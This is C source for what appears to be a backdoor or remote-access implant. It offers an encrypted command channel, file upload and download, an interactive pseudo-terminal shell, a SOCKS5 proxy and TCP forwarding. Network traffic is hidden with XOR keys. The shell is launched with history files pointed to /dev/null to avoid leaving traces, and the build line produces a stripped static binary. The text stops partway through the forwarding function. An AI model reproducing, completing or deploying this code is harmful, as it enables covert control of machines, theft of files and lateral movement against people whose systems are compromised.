/*
 gcc proxy.c dynbuf.c server.c -lutil -static -static-libgcc -s -o server

 gcc proxy.c dynbuf.c server.c -lutil -static -static-libgcc -s -Wl,--start-group -lc -lnss_files -lnss_dns -lresolv -Wl,--end-group -o server

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <termios.h>
#include <assert.h>
#include <errno.h>
#include <time.h>
#ifdef linux
#include <pty.h>
#endif

#include "dynbuf.h"
#include "proxy.h"

//#define DEBUG


#define ENCODE_KEY  "34$*%%yj5"
#define ENCODE_KEY2 "=azM493pg"

#define MAXUSER 5

#define _MAX_BUFSIZE 5*1024
#define MAX_DATA_SIZE 1024
#define M_MAX_PATH_ 512

#define MAXBUF 8192
#define MAXLINE 8192

#ifndef MAX_PATH
#define MAX_PATH 1024
#endif

#ifndef NOMINMAX
#ifndef max
#define max(a, b) (((a) > (b)) ? (a) : (b))
#endif
#ifndef min
#define min(a, b) (((a) < (b)) ? (a) : (b))
#endif
#endif // NOMINMAX

//----------------------------------------
// uint16_t 0xFFFF
#define CMD_LOGIN           0x2B11
#define CMD_LOGIN_YES       0x2B21

#define CMD_FILE_UPLOAD     0x3C11
#define CMD_FILE_SIZE       0x3C21
#define CMD_FILE_UPLOAD_YES 0x3C31
#define CMD_FILE_UPLOAD_GO  0x3C41
#define CMD_FILE_DOWN       0x3C51
#define CMD_DOWNLOAD_YES    0x4A10
#define CMD_DOWNLOAD_GO     0x4A20

#define CMD_SHELL_PTY       0x5A10
#define CMD_SHELL_ENV       0x5A15
#define CMD_SHELL_YES       0x5A20
#define CMD_SHELL_DATA      0x5A30

#define CMD_SOCKS5          0x6D20
#define CMD_SOCKS5_OK       0x6D30
#define CMD_SOCKS5_DATA     0x6D40
#define CMD_SOCKS5_ERROR    0x6D50

#define CMD_PATH_ERR        0xAA20
#define CMD_FILE_CREATE_ERR 0xAA30

#define CMD_CONNECT         0x3E11
#define CMD_CONNECT_OK      0x3E22
#define CMD_DISCONNECT      0x2C11
#define CMD_DISCONNECT_OK   0x2E22
#define CMD_ERROR           0x7A10


struct _host
{
    int sock;
    int state;
};
typedef struct _host HOST;

//--------------------------------------------------------
#define TIOCSCTTY 0x540E
#define TIOCGWINSZ 0x5413
#define TIOCSWINSZ 0x5414

#ifdef DEBUG
void debug(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    fprintf(stderr, "DEBUG: ");
    vfprintf(stderr, fmt, args);
    va_end(args);
}
#else
#define debug(format, args...)  do {} while(0);
#endif

#ifdef DEBUG
void report_bytes(const char *prefix, const char *buf, int len)
{
    debug("%s", prefix);
    while (0 < len)
    {
        fprintf(stderr, " %02x", *(unsigned char *)buf);
        buf++;
        len--;
    }
    fprintf(stderr, "\n");
    return;
}
#endif


void xor_buf(char *buf, size_t buf_len, const char *key, size_t key_len)
{
    size_t idx;

    for (idx = 0; idx < buf_len; idx++)
    {
        buf[idx] ^= key[idx % key_len];
    }

}

__attribute__((always_inline)) void encode(char *buffer, size_t buf_len)
{
#ifndef DEBUG2
    xor_buf(buffer, buf_len, ENCODE_KEY, strlen(ENCODE_KEY));

    xor_buf(buffer, buf_len, ENCODE_KEY2, strlen(ENCODE_KEY2));
#endif
}

__attribute__((always_inline)) void decode(char *buffer, size_t buf_len)
{
#ifndef DEBUG2
    xor_buf(buffer, buf_len, ENCODE_KEY2, strlen(ENCODE_KEY2));

    xor_buf(buffer, buf_len, ENCODE_KEY, strlen(ENCODE_KEY));
#endif
}



int pty, tty;

/* to avoid creating zombies ;) */
void sig_child(int i)
{
    signal(SIGCHLD, sig_child);
    waitpid(-1, NULL, WNOHANG);
}

void hangout(int i)
{
    kill(0, SIGHUP);
    kill(0, SIGTERM);
}

//----------------------------------------------------------------------------
#define FILECTL_ERR_open -1
#define FILECTL_ERR_read -2
#define FILECTL_ERR_write -4
typedef struct _filectl_t
{
    FILE *(*open)(char *_path, const char *mode);
    void (*close)(FILE *fp);
    int64_t (*read)(FILE *fp, char *buffer, int buffer_len);
    int64_t (*write)(FILE *fp, char *buffer, int buffer_len);
} filectl;

FILE *fs_open(char *_path, const char *mode)
{
    FILE *fp = fopen(_path, mode);
    if (fp == NULL)
    {
        return NULL;
    }

    return fp;
}

void fs_close(FILE *fp)
{
    if(fp != NULL)
    {
        fclose(fp);
    }
}

int64_t fs_read(FILE *fp, char *buffer, int buffer_len)
{
    size_t r_length = 0;

    //FILE *fp = fopen(_path, "rb");
    r_length = fread(buffer, sizeof(char), buffer_len, fp);
    if(r_length <= 0)
    {
        return FILECTL_ERR_read;
    }

    return r_length;
}

int64_t fs_write(FILE *fp, char *buffer, int buffer_len)
{
    size_t w_length = 0;

    w_length = fwrite(buffer, sizeof(char), buffer_len, fp);
    if(w_length <= 0)
    {
        return FILECTL_ERR_write;
    }

    return w_length;
}

//----------------------------------------------------------------------------
#define SK_ERR_socket -1
#define SK_ERR_connect -2
#define SK_ERR_bind -4
#define SK_ERR_listen -5
#define SK_ERR_send -6
#define SK_ERR_recv -7
typedef struct mysocks_t
{
    /*
        char *relay;
        char *type;
        uint16_t min_backoff_ms;
        uint16_t timeout;
        */
    void (*init)(struct sockaddr_in *sockaddr, char *addr, int port);
    int (*socket)();
    int (*bind)(int sockfd, struct sockaddr_in *dest_addr);
    int (*listen)(int sockfd, int max_user);
    int (*connect)(int sockfd, struct sockaddr_in *dest_addr);
    int (*accept)(int sockfd);
    int (*send)(int sockfd, char *data, int size);
    int (*recv)(int sockfd, char *data, int size);
} mysocks;

void sk_init(struct sockaddr_in *sockaddr, char *addr, int port)
{
    sockaddr->sin_family = AF_INET;
    sockaddr->sin_port = htons(port);

    sockaddr->sin_addr.s_addr = inet_addr(addr);
    // memcpy((void *)&dest_addr.sin_addr, (void *)host_addr->h_addr, host_addr->h_length);

}

int sk_socket()
{
    int sockfd;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return -1;
    }

    // off nagle
    int enable = 1;
    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    return sockfd;
}

int sk_bind(int sockfd, struct sockaddr_in *dest_addr)
{
    if (bind(sockfd, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) < 0)
    {
        return -1;
    }

    return 0;
}

int sk_listen(int sockfd, int max_user)
{
    if (listen(sockfd, max_user) == -1)
    {
        return -1;
    }

    return 0;
}

int sk_connect(int sockfd, struct sockaddr_in *dest_addr)
{
    if (connect(sockfd, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) < 0)
    {
        close(sockfd);

        return -1;
    }

    return 0;
}

int sk_connect2(char *addr, int port)
{
    int sockfd;
    struct sockaddr_in dst_addr;

    memset(&dst_addr, 0, sizeof(dst_addr));

    dst_addr.sin_family = AF_INET;
    dst_addr.sin_port = htons(port);

    dst_addr.sin_addr.s_addr = inet_addr(addr);

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return -1;
    }

    // off nagle
    int enable = 1;
    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    if (connect(sockfd, (struct sockaddr *)&dst_addr, sizeof(struct sockaddr)) < 0)
    {
        close(sockfd);

        return -1;
    }

    return sockfd;
}

int sk_accept(int sockfd)
{
    int sklen;
    struct sockaddr_in new_sock;
    int new_fd;

    sklen = sizeof(new_sock);
    new_fd = accept(sockfd, (struct sockaddr *)&new_sock, &sklen);
    if (new_fd < 0)
        return -1;

    return new_fd;
}

int sk_send(int sockfd, char *data, int size)
{
    int ret = 0;

    ret = send(sockfd, data, size, 0);
    if ( ret < 0)
    {
        return -1;
    }

    return ret;
}

int sk_recv(int sockfd, char *data, int size)
{
    int ret = 0;

    ret = recv(sockfd, data, size, 0);
    if ( ret < 0)
    {
        return -1;
    }

    return ret;
}

#if !defined(MSG_NOSIGNAL)
#define MSG_NOSIGNAL 0
#endif
int sk_send_all(int sockfd, char *buf, int size)
{
    int ret, total = 0;

    while (size)
    {
        ret = send(sockfd, buf, size, MSG_NOSIGNAL);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
            buf += ret;
        }

        if (ret <= 0)
            return ret;
    }

    return total;
}

int sk_recv_all(int sockfd, char *buf, int size)
{
    int ret, total = 0;

    while(size)
    {
        ret = recv(sockfd, buf, size, 0);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
            buf += ret;
        }

        if(ret <= 0)
            return ret;

    }

    return total;
}

/*
    mysocks *_mysocks = calloc(1, sizeof(*_mysocks));
    if (!_mysocks) {
        parser_error(section->context, "Not enough memory");
        return -1;
    }

    _mysocks->bind = sk_bind;

    free(_mysocks);
*/


int new_listen(mysocks *_sock, int port)
{
    struct sockaddr_in my_addr;
    int sock_fd;

    //struct sockaddr_in dest_addr;
    //  _mysocks.init(&dest_addr, host, atoi(port));

    sock_fd = _sock->socket();
    if (sock_fd == -1)
    {
        //exit(1);
        return SK_ERR_socket;
    }

    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(port);
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    int flag = 1;
    setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&flag, sizeof(flag));

    //setKeepAlive(sock_fd, 4, 1, 2);

    if (_sock->bind(sock_fd, &my_addr) == -1)
    {
#ifdef DEBUG
        perror(" bind");
#endif

        return SK_ERR_bind;
    }

    if (listen(sock_fd, MAXUSER) == -1)
    {
#ifdef DEBUG
        perror(" listen");
#endif

        return SK_ERR_listen;
    }

    return sock_fd;
}

static int send_file(mysocks *_sock, int sockfd, filectl *_filectl, char *file_path)
{
    FILE *fp = _filectl->open(file_path, "rb");
    if (fp == NULL)
    {
        return -1;
    }

    //char buffer[MAX_DATA_SIZE];
    char *buffer = (char *)alloca(sizeof(char) * MAX_DATA_SIZE);
    memset(buffer, 0, MAX_DATA_SIZE);

    int64_t block_len = 0;

    while ((block_len = _filectl->read(fp, buffer, MAX_DATA_SIZE)) > 0)
    {
        encode(buffer, block_len);

        if (_sock->send(sockfd, buffer, block_len) < 0)
        {
            return -2;
        }

        memset(buffer, 0, sizeof(buffer));
    }

    _filectl->close(fp);

    return 1;
}

static int recv_file(mysocks *_sock, int sockfd, FILE *fp, size_t file_size)
{
    int length;
    size_t total_w = 0;

    filectl _filectl =
    {
        fs_open,
        fs_close,
        fs_read,
        fs_write
    };


    char *buffer = (char *)alloca(sizeof(char) * MAX_DATA_SIZE);
    memset(buffer, 0, sizeof(buffer));

    size_t r_sum = MAX_DATA_SIZE;

    if(file_size < r_sum)
    {
        r_sum = file_size;
    }

    while ((length = _sock->recv(sockfd, buffer, r_sum)) > 0)
    {
        if (length < 0)
        {
            _filectl.close(fp);

            return -2;
        }

        decode(buffer, length);

        size_t w_length = _filectl.write(fp, buffer, length);
        if (w_length < length)
        {
            _filectl.close(fp);

            return -3;
        }

        total_w += w_length;
        if (total_w == file_size)
        {
            break;
        }

        if(file_size - total_w < r_sum)
        {
            r_sum = file_size - total_w;
        }

        memset(buffer, 0, sizeof(buffer));
    }
    fflush(fp);

    _filectl.close(fp);

    return 1;
}

int proxy_read_pkt(int sockfd, uint32_t *cmd, void *data, size_t len)
{
    int nRet;
    char buf[_MAX_BUFSIZE] = {0};
    uint32_t data_len = 0;
    uint32_t _command = 0;

    nRet = full_recv(sockfd, buf, sizeof(STREAM_HDR));
    if(nRet <= 0)
    {
        return -1;
    }

    decode(buf, nRet);

    if(nRet < sizeof(STREAM_HDR))
    {
        return -1;
    }

    STREAM_HDR *_stream_hdr = (STREAM_HDR *)buf;

    _command = _stream_hdr->command;
    data_len = _stream_hdr->len;

    if(data_len < 0)
    {
        return -1;
    }

    if((nRet - sizeof(STREAM_HDR)) != 0)
    {
        return -2;
    }

    memcpy(data, _stream_hdr, sizeof(STREAM_HDR));

    *cmd = _command;


    return sizeof(STREAM_HDR);
}

int proxy_send(int sockfd, STREAM_HDR *data, size_t data_sz)
{
    int nRet = 0;

    encode((char *)data, data_sz);

    nRet = full_send(sockfd, (char *)data, data_sz);
    if(nRet < 0)
    {
        return nRet;
    }

    return 0;
}


int goutbuf_have_data()
{
    dynbuf_t *outbuf = NULL;
    int buflen = 0;

    outbuf = get_streams_outbuf();
    if (outbuf != NULL)
    {
        if ((buflen = dynbuf_len(outbuf)) > 0)
        {
            return 1;
        }
    }

    return 0;
}

int goutbuf_write_sock(int sockfd)
{
    dynbuf_t *outbuf = NULL;
    int buflen = 0;

    outbuf = get_streams_outbuf();
    if (outbuf != NULL)
    {
        while ((buflen = dynbuf_len(outbuf)) > 0)
        {
            void *data = (void *)dynbuf_dataptr(outbuf);
            if (data != NULL)
            {
                STREAM_HDR *o_stream_hdr = (STREAM_HDR *)data;

                // outbuf data -> remote sock
                int nRet = proxy_send(sockfd, o_stream_hdr, sizeof(STREAM_HDR));
                if (nRet < 0)
                {
                    // printf(" send error! \n");

                    return -1;
                }

                dynbuf_consume(outbuf, sizeof(STREAM_HDR));
                //return buflen;
            }
        }

    }


    return 0;
}

void setNodelay(int sockFd)
{
    // off nagle
    int on = 1;
    setsockopt(sockFd, IPPROTO_TCP, TCP_NODELAY, (char *)&on, sizeof(on));
}

// nonblock
int try_connect(char *host, int port)
{
    int sock;
    struct sockaddr_in rsock;
    struct hostent *hostinfo;
    struct in_addr *addp;

    memset((char *)&rsock, 0, sizeof(rsock));

    // getaddrinfo
    if ((hostinfo = gethostbyname(host)) == NULL)
    {
        return -1;
    }
    //tryagain:
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
    {
        return -1;
    }

    addp = (struct in_addr *) * (hostinfo->h_addr_list);
    rsock.sin_addr = *addp;
    rsock.sin_family = AF_INET;
    rsock.sin_port = htons(port);

    int _err = 0;

    unsigned long imode = 1;
    ioctl(sock, FIONBIO, &imode);     // set non-blocking mode

    if (connect(sock, (struct sockaddr *)(&rsock), sizeof(rsock)) == -1)
    {
        if (errno == EADDRINUSE)        // EADDRINUSE 本地地址处于使用状态
        {
            // close sock
            // goto tryagain;
        }

        // nonblock mode , EINPROGRESS 操作还在进行中
        if (errno != EINPROGRESS)
        {
            _err = -1;
        }
    }

    if (_err == -1)
    {
        close(sock);

        return -1;
    }

    setNodelay(sock);

    return sock;
}



int get_dst_host(char *addr, char **oaddr, int *oport)
{
    char *sep;
    char hostInfo[512] = {0};

    // addr = host:port
    memcpy(hostInfo, addr, 512);

    // get host, port
    sep = strchr(hostInfo, ':');
    if (sep != NULL)
    {
        // host and port
        *oport = atoi(sep + 1);

        *sep = '\0';
        *oaddr = strdup(hostInfo);
    }
    else
    {
        // socks5 host/port is NULL
        *oport = 0;

        *oaddr = NULL;
    }

    return 0;
}


int proxy_dispatch(HOST *host)
{
    char rdata[_MAX_BUFSIZE];
    int rlen = 0;
    uint32_t cmd = 0;

    // 1. get cmd
    rlen = proxy_read_pkt(host->sock, &cmd, rdata, _MAX_BUFSIZE);
    if (rlen < 0)
    {
        return -1;
    }

    STREAM_HDR *i_stream = (STREAM_HDR *)rdata;

    if (i_stream->id > 0 && i_stream->len == 0 && i_stream->command == COMMAND_SOCKET_RECV_ERR)
    {
        //printf("[-] recv error: %d \r\n", i_stream->id);

        close_proxy_client(i_stream->id);

        return 0;
    }

    if (i_stream->id > 0 && i_stream->command == COMMAND_SOCKET_WRITE_ERR)
    {
        close_proxy_client(i_stream->id);

        return 0;
    }

    if (i_stream->len == 0 && i_stream->command == COMMAND_SOCKET_OPEN_ERR)
    {
        //printf("[-] open error: %d \r\n", i_stream->id);

        close_proxy_client(i_stream->id);

        return 0;
    }


    // 1. start cmd,
    //  get host,port , connect host
    if (i_stream->command == STREAM_STATE_FORWARD_START)
    {
        char *dsthost = NULL;
        int dstport = 0;
        get_dst_host(i_stream->data, &dsthost, &dstport);

        int remote_sock = try_connect(dsthost, dstport);

        ///printf("[-]  _connect: %s:%d \r\n", dsthost, dstport);

        if (remote_sock == -1)
        {
            // connect err
            write_outbuf_data(i_stream->id, COMMAND_SOCKET_CONNECT_ERR, NULL, 0);

            //printf("[-] connect err \r\n");

            free(dsthost);

            return 0;
        }
        // add remote_sock
        if (remote_sock > 0 && remote_sock != -1)
        {
            add_proxy_client2(i_stream->id, remote_sock, SOCK_STATE_CONNECTING, dsthost, dstport);

            //set_stream_host(i_stream->id, dsthost, dstport);
            free(dsthost);

            return 0;
        }
    }


    // write data to proxy client
    if (i_stream->command == CLIENT_STATE_FORWARD_DATA)
    {
        write_data2stream(i_stream->id, i_stream->data, i_stream->len);

        return 0;
    }

    // exit
    if (i_stream->len == 0 && i_stream->command == CLIENT_STATE_FORWARD_END)
    {
        return -2;
    }

    return 0;
}


int proxy_run = 0;
int proxy_loop(HOST *host)
{
    int ready;
    int maxfd;
    fd_set readfds;
    fd_set writefds;

    int sock = host->sock;

    init_proxy_env();

    while(proxy_run == 1)
    {
        // 1. read sock, get cmd
        struct timeval timeout;

        FD_ZERO(&readfds);
        FD_ZERO(&writefds);


        // master fd read
        FD_SET(sock, &readfds);

        if (goutbuf_have_data() == 1)
        {
            FD_SET(sock, &writefds);
        }
        maxfd = max(maxfd, sock);


        maxfd = add_sock2fds(sock, &readfds, &writefds);
        maxfd = max(maxfd, sock);

        ready = select_event(maxfd, &readfds, &writefds, 4000);
        if (ready == -1)
        {
            // select error
            stop_proxy(host->sock);

            return -1;
        }

        if (ready == 0)
        {
            continue;
        }


        // read
        if (FD_ISSET(sock, &readfds))
        {
            ready = proxy_dispatch(host);
            if (ready < 0)
            {
                stop_proxy(host->sock);

                return -1;
            }
        }

        if (FD_ISSET(sock, &writefds))
        {
            goutbuf_write_sock(host->sock);
        }
    }

    stop_proxy(host->sock);

    return 0;
}

int stop_proxy(int sockfd)
{
    int nRet = 0;

    if(proxy_run != 1)
    {
        return 0;
    }

    proxy_run = 0;

    close_proxy_all_client();

    // send stop cmd
    STREAM_HDR o_stream_hdr = {0};
    o_stream_hdr.id = 0;
    o_stream_hdr.command = CLIENT_STATE_FORWARD_END;
    o_stream_hdr.len = 0;

    nRet = proxy_send(sockfd, &o_stream_hdr, sizeof(STREAM_HDR));
    if (nRet < 0)
    {
        return -1;
    }

    clear_outbuf();

    free_outbuf();

    return -1;
}

int start_socks5(int sockfd, char *data)
{
    if (sock_send(sockfd, CMD_SOCKS5_OK, NULL, 0) < 0)
    {
        return -1;
    }


    proxy_run = 1;

    HOST host;
    host.sock = sockfd;

    proxy_loop(&host);

    return 0;
}


#if !defined(MSG_NOSIGNAL)
#define MSG_NOSIGNAL 0
#endif
int full_send(int fd, char *buf, int size)
{
    int ret, total = 0;

    while (size)
    {
        ret = send(fd, buf, size, MSG_NOSIGNAL);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
            buf += ret;
        }

        if (ret <= 0)
            return ret;
    }

    return total;
}

int full_recv(int fd, char *buf, int size)
{
    int ret, total = 0;

    while(size)
    {
        ret = recv(fd, buf, size, 0);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
            buf += ret;
        }

        if(ret <= 0)
            return ret;

    }

    return total;
}



int ksock_write(int sockfd, char *msg, int msg_len)
{
    if (full_send(sockfd, msg, msg_len) < 0)
    {
        return -1;
    }

    return 1;
}

int ksock_read(int sockfd, char *data, int data_len, int time_out)
{
    int ret = 0;

    ret = full_recv(sockfd, data, data_len);

    return ret;
}

struct _pkt_hdr
{
    uint32_t    len;
    uint16_t    type;
};
typedef struct _pkt_hdr PKT_HDR;
// len;type;payload
int sock_send(int sock, int type, char *data, size_t data_len)
{
    int nRet = 0;
    char wbuf[6 * 1024] = {0};
    int buf_Len = 0;
    int hdr_len = 0;
    PKT_HDR _pkt_hdr;
    char enc_buf[5 * 1024] = {0};
    size_t enc_size = 0;

    _pkt_hdr.len = data_len;
    _pkt_hdr.type = type;

    hdr_len = sizeof(PKT_HDR);

    // encode hdr
    encode((char *)&_pkt_hdr, hdr_len);

    memcpy(wbuf, &_pkt_hdr, hdr_len);

    // add payload
    if(data != NULL && data[0] != 0x00)
    {
        // encode data
        encode(data, data_len);

        memcpy(wbuf + hdr_len, data, data_len);
        buf_Len = hdr_len + data_len;
    }
    else
    {
        buf_Len = hdr_len;
    }

    nRet = ksock_write(sock, wbuf, buf_Len);
    if(nRet < 0)
    {
        return nRet;
    }

    return 0;
}

// len;type;payload
int sock_read(int sock, int *type, void *data, size_t len)
{
    int nRet = 0;
    char buf[4000] = {'\0'};
    PKT_HDR *_pkt_hdr = NULL;
    uint32_t data_len = 0;
    uint32_t _type = 0;
    char dec_buf[5 * 1024] = {0};
    size_t dec_size = 0;

    nRet = ksock_read(sock, buf, sizeof(PKT_HDR), 0);
    if(nRet < 0)
    {
        return -1;
    }

    // decode hdr
    decode(buf, nRet);

    if(nRet != sizeof(PKT_HDR))
    {
        return -1;
    }

    _pkt_hdr = (PKT_HDR *)buf;

    data_len = _pkt_hdr->len;
    _type = _pkt_hdr->type;

    if(data_len < 0)
    {
        return -1;
    }

    if(data_len == 0)
    {
        nRet = 0;
    }

    if(data_len > 0 && data_len <= len)
    {
        memset(buf, 0, sizeof(buf));

        // read payload
        nRet = ksock_read(sock, buf, data_len, 0);
        if(nRet < 0)
        {
            return -1;
        }

        // decode data
        decode(buf, nRet);

        memcpy(data, buf, nRet);
    }

    *type = _type;

    return nRet;
}


char flag_key[2] = {0xF7, 0xA0}; // size cmd
typedef struct
{
    char flag[2];
    int32_t ws_row;
    int32_t ws_col;
} MSG_WINCH, *pMSG_WINCH;
typedef struct
{
    char term[256];
    int32_t ws_row;
    int32_t ws_col;
} MSG_ENV, *pMSG_ENV;


int get_cmd_ctl2(char *data, int len)
{
    struct winsize ws;

    pMSG_WINCH msg_winch = (MSG_WINCH *)data;
    if (msg_winch->flag[0] == flag_key[0] && msg_winch->flag[1] == flag_key[1])
    {
        ws.ws_row = msg_winch->ws_row;
        ws.ws_col = msg_winch->ws_col;
        ws.ws_xpixel = 0;
        ws.ws_ypixel = 0;

        ///debug(" new win size:%d,%d\n", ws.ws_row, ws.ws_col);

        ioctl(pty, TIOCSWINSZ, &ws);

        return 1;
    }

    return 0;
}

int pty_recv(int sockfd, char *data, size_t len)
{
    int nRet = 0;
    int cmd_type = 0;

    nRet = sock_read(sockfd, &cmd_type, data, len);
    if ( nRet < 0)
    {
        return -1;
    }

    if(cmd_type == CMD_SHELL_DATA)
    {
        if(nRet > 0)
            return nRet;
    }

    return 0;
}

int pty_send(int sockfd, char *data, size_t len)
{
    if (sock_send(sockfd, CMD_SHELL_DATA, data, len) < 0)
        return -1;

    return 1;
}

int pty_main(mysocks *_sock, int client)
{
    fd_set rds;
    struct winsize ws;
    char *slave, *shell;
    int ret, pid, pty, tty, n;
    char *p, *argv[3] = {NULL, NULL};
    char *envp[] =
    {
        "TERM=linux",
        "HOME=/",
        "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
        "BASH_HISTORY=/dev/null",
        "HISTORY=/dev/null",
        "history=/dev/null",
        "HISTFILE=/dev/null",
        NULL
    };

    if ((shell = getenv("SHELL")) == NULL || *shell == '\0')
        shell = "/bin/bash";

    if ((p = strrchr(shell, '/')))
        p++;
    else
        p = (char *)shell;

    argv[0] = p;
    argv[1] = NULL;

    if (openpty(&pty, &tty, NULL, NULL, NULL) < 0)
    {
        ///debug(" error: openpty: %s", strerror(errno));
        return 1;
    }
    slave = ttyname(tty);
    if (slave == NULL)
    {
        return 1;
    }

    putenv("HISTFILE=");


    char buffer[BUFSIZ + 1];
    bzero(buffer, BUFSIZ);

    int cmd_type = 0;
    if (sock_read(client, &cmd_type, buffer, 4000) < 0)
    {
        return SK_ERR_recv;
    }

    if(cmd_type != CMD_SHELL_ENV)
    {
        //printf(" error: pty env \n");
        return 0;
    }

    // get pty env
    pMSG_ENV msg = (pMSG_ENV)buffer;

    ///debug(" get term env: %s\n", msg->term);
    putenv(msg->term);

    ws.ws_row = msg->ws_row;
    ws.ws_col = msg->ws_col;

    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    ///debug(" win size:%d,%d\n", ws.ws_row, ws.ws_col);
    if (ioctl(pty, TIOCSWINSZ, &ws) < 0)
    {
        debug(" error: ioctl(): %s", strerror(errno));
    }

    if ((pid = fork()) < 0)
    {
        debug(" error: fork(): %s", strerror(errno));
        return 1;
    }

    if (pid == 0)
    {
        //Child
        close(client);
        close(pty);

        if (setsid() < 0)
        {
            debug(" error: setsid(): %s\n", strerror(errno));
        }

        if (ioctl(tty, TIOCSCTTY, NULL) < 0)
        {
            debug(" error: ioctl(): %s\n", strerror(errno));
        }

        dup2(tty, 0);
        dup2(tty, 1);
        dup2(tty, 2);

        if (tty > 2)
        {
            close(tty);
        }

        execve(shell, argv, envp);
    }
    else
    {
        //Parent
        close(tty);

        for (;;)
        {
            FD_ZERO(&rds);
            FD_SET(client, &rds);
            FD_SET(pty, &rds);

            n = (pty > client) ? pty : client;

            if (select(n + 1, &rds, NULL, NULL, NULL) == 0)
            {
                if (errno == EINTR)
                    continue;

                /// perror("select");
                return -1;
            }

            if (FD_ISSET(client, &rds))
            {
                bzero(buffer, sizeof(buffer));

                ret = pty_recv(client, buffer, MAX_DATA_SIZE);
                if (ret > 0)
                {
                    pMSG_WINCH msg_winch = (pMSG_WINCH)buffer;
                    if (get_cmd_ctl2(buffer, ret) > 0 )
                    {
                        memset(buffer, 0, ret);
                    }

                    ret = write(pty, buffer, ret);
                    if (ret <= 0)
                        break;
                }
                else
                    break;
            }

            if (FD_ISSET(pty, &rds))
            {
                bzero(buffer, sizeof(buffer));

                ret = read(pty, buffer, MAX_DATA_SIZE);
                if (ret > 0)
                {
                    ret = pty_send(client, buffer, ret);
                    if (ret <= 0)
                        break;
                }
                else
                    break;
            }
        }
        close(pty);

        return 0;
    }

    return 1;
}


int is_dir(char *_path)
{
    struct stat st;

    //Get file info
    memset(&st, 0, sizeof(struct stat));
    if (stat(_path, &st) == -1)
    {
        return -1;
    }

    if (S_ISDIR(st.st_mode))
    {
        return 1;
    }

    return 0;
}

int is_exists(char *_path)
{
    if (access(_path, F_OK) == 0)
    {
        return 1;
    }

    return 0;
}

int path_check2(char *_path)
{
    if(is_dir(_path) == 1)
    {
        return -3;
    }

    if(is_exists(_path) == 1)
    {
        return -1;
    }

    return 0;
}

int64_t get_file_size(char *_path)
{
    struct stat st;

    //Get file info
    memset(&st, 0, sizeof(struct stat));
    if (stat(_path, &st) == -1)
    {
        return -1;
    }

    return st.st_size;
}


#ifndef SOCKET_ERROR
#define SOCKET_ERROR -1
#endif

#ifdef _WIN32
#define socket_errno() WSAGetLastError()
#else
#define SOCKET int

#define closesocket close
#define socket_errno() (errno)
#endif

/* reason of end repeating */
#define REASON_UNK -2
#define REASON_ERROR -1
#define REASON_CLOSED_BY_LOCAL 0
#define REASON_CLOSED_BY_REMOTE 1
int tcp_forward(SOCKET local_in, SOCKET local_out, SOCKET remote)
{
    int f_hold_session = 0;

    /** vars for local input data **/
    char lbuf[5120]; /* local input buffer */
    int lbuf_len;    /* available data in lbuf */
    int f_local;     /* read local input more? */
    /** vars for remote input data **/
    char rbuf[5120];               /* remote input buffer */
    int rbuf_len;                  /* available data in rbuf */
    int f_remote;                  /* read remote input more? */
    int close_reason = REASON_UNK; /* reason of end repeating */
    /** other variables **/
    int nfds, len;
    fd_set ifds, ofds;

    /* repeater between stdin/out and socket  */
    nfds = ((local_in < remote) ? remote : local_in) + 1;
    f_local = 1;  /* yes, read from local */
    f_remote = 1; /* yes, read from remote */
    lbuf_len = 0;
    rbuf_len = 0;

    while (f_local || f_remote)
    {
        struct timeval *tmo;
        FD_ZERO(&ifds);
        FD_ZERO(&ofds);
        tmo = NULL;

        /** prepare for reading local input **/
        if (f_local && (lbuf_len < (int)sizeof(lbuf)))
        {
            FD_SET(local_in, &ifds);
        }

        /** prepare for reading remote input **/
        if (f_remote && (rbuf_len < (int)sizeof(rbuf)))
        {
            FD_SET(remote, &ifds);
        }

        /* FD_SET( local_out, ofds ); */
        /* FD_SET( remote, ofds ); */

        if (select(nfds, &ifds, &ofds, (fd_set *)NULL, tmo) == -1)
        {
            /* some error */
            debug("select() failed, %d\n", socket_errno());
			
            return REASON_ERROR;
        }

        /* remote => local */
        if (FD_ISSET(remote, &ifds) && (rbuf_len < (int)sizeof(rbuf)))
        {
            len = recv(remote, rbuf + rbuf_len, sizeof(rbuf) - rbuf_len, 0);
            if (len == 0 || (len == -1 && socket_errno() == ECONNRESET))
            {
                debug("connection %s by peer\n", (len == 0) ? "closed" : "reset");
                close_reason = REASON_CLOSED_BY_REMOTE;
                f_remote = 0; /* no more read from socket */
                f_local = 0;
            }
            else if (len == -1)
            {
                /* error */
                debug("recv() failed, %d\n", socket_errno());
            }
            else
            {
                debug("recv %d bytes\n", len);

                rbuf_len += len;
            }
        }

        /* local => remote */
        if (FD_ISSET(local_in, &ifds) && (lbuf_len < (int)sizeof(lbuf)))
        {
            len = recv(local_in, lbuf + lbuf_len, sizeof(lbuf) - lbuf_len, 0);
            if (len == 0)
            {
                debug("local input is EOF\n");
                if (!f_hold_session)
                    shutdown(remote, 1); /* no-more writing */

                f_local = 0;
                close_reason = REASON_CLOSED_BY_LOCAL;
            }
            else if (len == -1)
            {
                /* error on reading from stdin */
                if (f_hold_session)
                {
                    debug("failed to read from local\n");
                    f_local = 0;
                    close_reason = REASON_CLOSED_BY_LOCAL;
                }
                else
                    debug("recv() failed, errno = %d\n", errno);
            }
            else
            {
                /* repeat */
                lbuf_len += len;
            }
        }

